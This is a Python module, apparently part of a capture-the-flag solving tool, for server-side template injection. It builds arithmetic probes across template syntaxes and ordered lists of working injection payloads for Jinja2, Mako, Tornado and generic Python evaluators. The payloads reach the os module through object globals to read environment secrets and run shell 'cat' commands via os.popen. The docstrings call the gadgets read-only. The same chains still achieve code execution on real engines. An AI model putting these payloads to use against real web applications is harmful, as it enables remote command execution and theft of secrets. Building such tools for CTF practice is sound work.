"""Server-side template injection: arithmetic detection + read-only flag gadgets.

Detection avoids the classic ``7*7`` signature (which challenges often filter or
which appears by accident). Instead it multiplies two random-ish operands and
checks the product appears while the literal expression does not.

The exploitation gadgets are strictly read-only: they fetch the ``FLAG``
environment variable or ``cat`` a short list of conventional CTF flag paths. No
gadget writes files, opens sockets, or runs anything destructive.
"""
from __future__ import annotations

# Arithmetic probes across template syntaxes. {a}/{b} operands, {w} wrapper.
ARITHMETIC: list[tuple[str, str]] = [
    ("jinja-twig-nunjucks", "{w}{{{{{a}*{b}}}}}{w}"),
    ("erb-ejs", "{w}<%= {a}*{b} %>{w}"),
    ("freemarker-jsp-el", "{w}${{{a}*{b}}}{w}"),
    ("thymeleaf", "{w}#{{{a}*{b}}}{w}"),
    ("smarty", "{w}{{{a}*{b}}}{w}"),
    ("mako", "{w}${{{a}*{b}}}{w}"),
    ("dot-doT", "{w}{{={a}*{b}}}{w}"),
]

# Read-only flag gadgets by engine. {cmd} is substituted with a read command.
# These are intentionally scoped to flag retrieval.
FLAG_PATHS = ("/flag", "/flag.txt", "/app/flag", "/app/flag.txt",
              "flag", "flag.txt", "../flag", "../flag.txt")

JINJA2_GADGETS = [
    "{{cycler.__init__.__globals__.os.environ.get('FLAG','')}}",
    "{{self.__init__.__globals__.__builtins__.__import__('os').environ.get('FLAG','')}}",
    "{{request.application.__globals__.__builtins__.__import__('os').environ.get('FLAG','')}}",
    "{{cycler.__init__.__globals__.os.popen('cat " + " ".join(FLAG_PATHS) + " 2>/dev/null').read()}}",
    "{{lipsum.__globals__.os.popen('cat " + " ".join(FLAG_PATHS) + " 2>/dev/null').read()}}",
]

GENERIC_PYTHON_GADGETS = [
    "{{__import__('os').environ.get('FLAG','')}}",
    "{{__import__('os').popen('cat " + " ".join(FLAG_PATHS) + " 2>/dev/null').read()}}",
    "${__import__('os').environ.get('FLAG','')}",
]

MAKO_GADGETS = [
    "${self.module.cache.util.os.environ.get('FLAG','')}",
    "<%import os%>${os.environ.get('FLAG','')}",
]

TORNADO_GADGETS = [
    "{% raw __import__('os').environ.get('FLAG','') %}",
]


def arithmetic(wrapper: str, a: int, b: int) -> list[tuple[str, str, str]]:
    """Return ``[(label, payload, expected_product_text), ...]``."""
    out = []
    for label, tpl in ARITHMETIC:
        payload = tpl.format(w=wrapper, a=a, b=b)
        out.append((label, payload, f"{wrapper}{a * b}{wrapper}"))
    return out


def flag_gadgets(engine: str = "") -> list[str]:
    """Read-only flag gadgets ordered best-first for the detected engine.

    Engine-specific gadgets come first (e.g. Jinja2's ``cycler`` chain for a Flask
    target), always followed by the generic Python gadgets as a fallback, so a
    plain ``{{ __import__('os')... }}`` evaluator is still covered.
    """
    engine = (engine or "").lower()
    primary: list[str] = []
    if "jinja" in engine or "flask" in engine or "werkzeug" in engine or "twig" in engine or "nunjucks" in engine:
        primary = JINJA2_GADGETS
    elif "mako" in engine:
        primary = MAKO_GADGETS
    elif "tornado" in engine:
        primary = TORNADO_GADGETS

    seen: set[str] = set()
    out: list[str] = []
    for group in (primary, GENERIC_PYTHON_GADGETS, JINJA2_GADGETS, MAKO_GADGETS, TORNADO_GADGETS):
        for g in group:
            if g not in seen:
                seen.add(g)
                out.append(g)
    return out
